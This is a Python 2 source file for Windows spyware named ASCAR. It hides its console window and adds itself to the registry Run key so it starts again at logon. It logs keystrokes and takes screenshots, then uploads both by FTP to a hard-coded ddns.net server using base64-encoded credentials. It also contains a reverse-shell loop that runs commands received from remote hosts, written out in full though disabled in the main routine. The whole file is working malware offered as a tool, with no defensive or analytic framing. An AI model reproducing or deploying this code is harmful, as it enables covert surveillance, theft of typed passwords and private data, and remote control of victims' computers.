import os, sys, win32console, win32gui, socket, subprocess,  time, threading, hashlib, ftplib, pythoncom, pyHook, win32api
import pyscreenshot as ImageGrab

class program(object):
	"""This class is responsible for holding important program information."""
	def __init__(self, name, version, ctime, dns_list, dns_port):
		super(program, self).__init__()
		self.name = name
		self.version = version
		self.ctime = ctime
		self.dns_list = dns_list
		self.dns_port = int(dns_port)

	def initialization(self, name, version, ctime):
		print str(name) + ' v.' + str(version) + ' started at ' + str(ctime) + '.'
		if(debug_mode == False):
			print '	Debug Mode: OFF'
		if(debug_mode == True):
			print '	Debug Mode: ON'

class module(object):
	"""This class is responsible for Module's informations."""
	def __init__(self, module_list):
		super(Module, self).__init__()
		self.module_list = module_list

	class fileTransferProtocol(object):
		"""This module is responsible for ftp operations algorithms."""
		def __init__(self, host, port, user, password):
			self.host = host
			self.port = port
			self.user = str(user).decode('base64')
			self.password = str(password).decode('base64')

		@classmethod
		def upload(self, fileName):
			if(os.path.isfile(fileName)):
				ftp.storbinary('STOR ' + str(fileName), open(fileName, 'rb'))
			else:
				print 'Could not find %s or is not a file.' % (str(fileName))
				return False

	class thread(object):
		"""This module is responsible for threading operations algorithms."""
		def __init__(self):
			super(thread, self).__init__()

		@classmethod
		def start(self, function_name,args):
			str_function_name = str(function_name)
			print ' [+] Thread: ' + str_function_name + ' starting...'
			t = threading.Thread(target=function_name, args=tuple(args))
			try:
				t.start()
			except Exception as e:
				fileName = 'error_log_' + str(str(time.ctime()).replace(':','')).replace(' ','') + '.txt'
				f = open(fileName,'w')
				f.write(str(e))
				f.close()
				print ' [!] Error: ' + str(e)
				print '\nLog: ' + str(fileName)
			print ' [*] Thread: ' + str_function_name + ' started.'
			return t


	class registry(object):
		"""This module is responsible for registry operations algorithms."""
		def __init__(self):
			super(registry, self).__init__()

		@classmethod
		def install(self, p_name):
			name = module.encryption.toSHA256(str(p_name))
			command = 'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "' + str(name) + '" /t REG_SZ /F /D "' + str(os.path.realpath(sys.argv[0])) + '"'
			try:
				os.system(command)
			except Exception as e:
				fileName = 'error_log_' + str(time.ctime()) + '.txt'
				f = open(fileName,'w')
				f.write(e)
				f.close()
				print ' [!] Error: ' + str(e)
				print '\nLog: ' + str(fileName)

	class stealth(object):
		"""This module is resposible for stealth algorithms."""
		def __init__(self):
			super(stealth, self).__init__()

		@classmethod
		def hide(self):
			window = win32console.GetConsoleWindow()
			win32gui.ShowWindow(window,0)
			return True

	class encryption(object):
		"""This module is responsible for encryption algorithms."""
		def __init__(self):
			super(encryption, self).__init__()

		@classmethod
		def toSHA256(self, string):
			h = hashlib.sha256()
			h.update(string)
			target = h.hexdigest()
			return str(target)

	class socket(object):
		"""This module is responsible for socket algorithms."""
		def __init__(self):
			super(socket, self).__init__()

		@classmethod
		def connect(self, host, port):
			global connected
			try:
				s = socket.socket()
				s.connect((str(host), int(port)))
				connected = True
				while 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())
			except Exception as e:
				print str(e)
				time.sleep(15)
				print 'Retrying connection to ' + str(host) + ':' + str(port) + ' in ' + ' 3 seconds...'
				time.sleep(3)
				module.socket.connect(str(host), int(port))


class Connect():
	def __init__(self):
		self.thread = threading.Thread(target=self.run)

	def run(self):
		dns_list = ['127.0.0.1','escaserver.ddns.net','lyriumhideout.ddns.net','nest0r.ddns.net']
		for dns in dns_list:
			try:
				print 'TCP Connect: Trying to connect to ' + str(dns) + '...'
				s = socket.socket()
				s.connect((str(dns), int(port)))
				print 'TCP Connect: Connected.'
				while 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())
				
			except:
				print 'TCP Connect: ERROR - Could not connect to ' + str(dns)

class Keylogger():
	def __init__(self):
		self.thread = threading.Thread(target=self.run)

	def run(self):
		global host
		global port
		global user
		global password
		while 1:
			global buffer
			buffer = ''

			def OnKeyboardEvent(event):
				#print 'MessageName:', event.MessageName
				#print 'Message:',event.Message
				#print 'Time:',event.Time
				#print 'Window:',event.Window
				#print 'WindowName:',event.WindowName
				#print 'Ascii:', event.Ascii, chr(event.Ascii)
				#print 'Key:', event.Key
				#print 'KeyID:', event.KeyID
				#print 'ScanCode:', event.ScanCode
				#print 'Extended:', event.Extended
				#print 'Injected:', event.Injected
				#print 'Alt', event.Alt
				#print 'Transition', event.Transition
				#print '---'

				if event.Ascii < 256 or event.Ascii <> 0:
					global buffer
					
					print 'ASCII Event Number: ' + str(event.Ascii)
					if event.Ascii==5:
						_exit(1)
					if event.Ascii !=0 or 8:	
						keylogs=chr(event.Ascii)
						print 'Key Pressed: ' + str(keylogs)
						if event.Ascii==13:
							keylogs='/n'
						buffer+=keylogs
						print 'Actual buffer Lenght: ' + str(len(buffer))
						if(len(buffer) > 100):
							fileName = str(str(time.ctime()).replace(' ','_')).replace(':','') + '.keys'
							pc_name = str(os.environ['COMPUTERNAME'])
							f=open(fileName,'a')
							f.write(buffer)
							f.close()
							buffer = ''
							

			# create a hook manager object
			hm=pyHook.HookManager()
			hm.KeyDown=OnKeyboardEvent
			# set the hook
			hm.HookKeyboard()
			# wait forever
			pythoncom.PumpMessages()

class SendKeys():
	def __init__(self):
		self.thread = threading.Thread(target=self.run)

	def run(self):
		try:
			time.sleep(10)
			pc_name = str(os.environ['COMPUTERNAME'])
			ftp = ftplib.FTP()
			ftp.connect(host,port)
			ftp.login(user,password)
			print ' [+] Keylogger: FTP Connected to %s:%s' % (str(host), str(port))
			ftp.cwd('Furnace')
			try:
				ftp.cwd(pc_name)
			except:
				ftp.mkd(pc_name)
				ftp.cwd(pc_name)
			for file in os.listdir(str(os.getcwd())):
				if file.endswith(".keys"):
					fileName = file
					
					if(os.path.isfile(fileName)):
						ftp.storbinary('STOR ' + str(fileName), open(fileName, 'rb'))
					else:
						print 'Could not find %s or is not a file.' % (str(fileName))
						return False
					print [' [+] Keylogger: "' + str(fileName) + '" upload sucess.']
					ftp.close()
					try:
						os.remove(fileName)
					except:
						pass
			ftp.close()
			time.sleep(10)
		except:
			pass

class SendPics():
	def __init__(self):
		self.thread = threading.Thread(target=self.run)

	def run(self):
		try:
			time.sleep(200)
			pc_name = str(os.environ['COMPUTERNAME'])
			ftp = ftplib.FTP()
			ftp.connect(host,port)
			ftp.login(user,password)
			print ' [+] Screenshot: FTP Connected to %s:%s' % (str(host), str(port))
			ftp.cwd('Furnace')
			try:
				ftp.cwd(pc_name)
			except:
				ftp.mkd(pc_name)
				ftp.cwd(pc_name)
			for file in os.listdir(str(os.getcwd())):
				if file.endswith(".jpg"):
					fileName = file
					
					if(os.path.isfile(fileName)):
						ftp.storbinary('STOR ' + str(fileName), open(fileName, 'rb'))
					else:
						print 'Could not find %s or is not a file.' % (str(fileName))
						return False
					print [' [+] Screenshot: "' + str(fileName) + '" upload sucess.']
					try:
						os.remove(fileName)
					except:
						pass
			ftp.close()
		except:
			pass

class Screenshot():
	def __init__(self):
		self.thread = threading.Thread(target=self.run)

	def run(self):
		while 1:
			try:
				global ftp
				ftp = ftplib.FTP()
				ftp.connect(host,port)
				ftp.login(user,password)
				print ' [+] FTP: Connected to %s:%s' % (str(host),str(port))
				ftp.cwd('Furnace')
				pc_name = str(os.environ['COMPUTERNAME'])
				fileName = pc_name + '_' + str(str(time.ctime()).replace(' ','_')).replace(':','') + '.jpg'
				im = ImageGrab.grab_to_file(fileName)
				try:
					ftp.cwd(pc_name)
				except:
					ftp.mkd(pc_name)
					ftp.cwd(pc_name)
				module.fileTransferProtocol.upload(fileName)
				print [' [+] Screenshot: "' + str(fileName) + '" upload sucess.']
				ftp.close()
				try:
					os.remove(fileName)
				except:
					pass
				time.sleep(300)
			except:
				pass



def main2():

	global host
	global port
	global user
	global password
	global debug_mode
	global connected

	connected = False

	#DEBUG MODE
	debug_mode = False


	#START PROGRAM
	dns_list = ['127.0.0.1','escaserver.ddns.net','lyriumhideout.ddns.net','nest0r.ddns.net']
	p = program('ASCAR','0.1.1',str(time.ctime()),dns_list,8624)
	p.initialization(p.name, p.version, p.ctime)
	fp = module.fileTransferProtocol('nest0r.ddns.net',21,'YWRtaW4=','bXluYW1laXNuZXN0b3I=')
	host = fp.host
	port = fp.port
	user = fp.user
	password = fp.password

	#install on Registry "RUN"
	if(debug_mode == False):
		module.stealth.hide()
		module.registry.install(p.name)

	t1 = Keylogger()
	t2 = Screenshot()
	#t3 = Connect()
	t4 = SendKeys()
	#t5 = SendPics()


	t1_e = True
	t2_e = True
	#t3_e = True
	t4_e = True
	#t5_e = True

	while 1:
		try:

			#start Socket conn (shell)
			#for dns in dns_list:
				#if(connected == False):
				#	shell = module.thread.start(module.socket.connect,(dns,p.dns_port))

			if(t1_e == True):
				if(t1.thread.isAlive() == False):
					print 'Keylogger: Closed.'
					t1 = Keylogger()
					t1.thread.start()
					print 'Keylogger: Restarted.'

			if(t2_e == True):
				if(t2.thread.isAlive() == False):
					print 'Screenshot: Closed.'
					t2 = Screenshot()
					t2.thread.start()
					print 'Screenshot: Restarted.'

			#if(t3_e == True):
				#if(t3.thread.isAlive() == False):
					#print 'TCP Connect: Closed.'
					#t3 = Connect()
					#t3.thread.start()
					#print 'TCP Connect: Restarted.'

			if(t4_e == True):
				if(t4.thread.isAlive() == False):
					print 'SendKeys: Closed.'
					t4 = SendKeys()
					t4.thread.start()
					print 'SendKeys: Restarted.'

			#if(t5_e == True):
				#if(t5.thread.isAlive() == False):
					#print 'SendPics: Closed.'
					#t5 = SendPics()
					#t5.thread.start()
					#print 'SendPics: Restarted.'
			time.sleep(15)
		except KeyboardInterrupt:
			sys.exit(0)

if __name__ == '__main__':
	main2()